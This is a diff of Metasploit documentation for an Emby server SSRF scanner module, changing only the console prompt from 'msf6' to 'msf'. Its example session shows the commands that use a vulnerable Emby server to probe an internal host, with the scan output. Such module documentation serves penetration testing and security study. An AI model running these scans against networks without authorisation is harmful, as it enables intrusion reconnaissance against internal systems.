@@ -39,12 +39,12 @@ If set to `false`, will not store the captured information in notes. Use `notes 
 ### Emby Server (v4.4.3 on Ubuntu) - Scan Internal 192.168.2.0 Network
 
 ```
-msf6 > use auxiliary/scanner/http/emby_ssrf_scanner
-msf6 auxiliary(scanner/http/emby_ssrf_scanner) > set emby_server 10.10.200.32
+msf > use auxiliary/scanner/http/emby_ssrf_scanner
+msf auxiliary(scanner/http/emby_ssrf_scanner) > set emby_server 10.10.200.32
 emby_server => 10.10.200.32
-msf6 auxiliary(scanner/http/emby_ssrf_scanner) > set rhosts 192.168.2.3
+msf auxiliary(scanner/http/emby_ssrf_scanner) > set rhosts 192.168.2.3
 rhosts => 192.168.2.3
-msf6 auxiliary(scanner/http/emby_ssrf_scanner) > run
+msf auxiliary(scanner/http/emby_ssrf_scanner) > run
 
 [+] 192.168.2.3:8096 Title: Emby
 [+] 192.168.2.3:8096     HTTP Code: 200
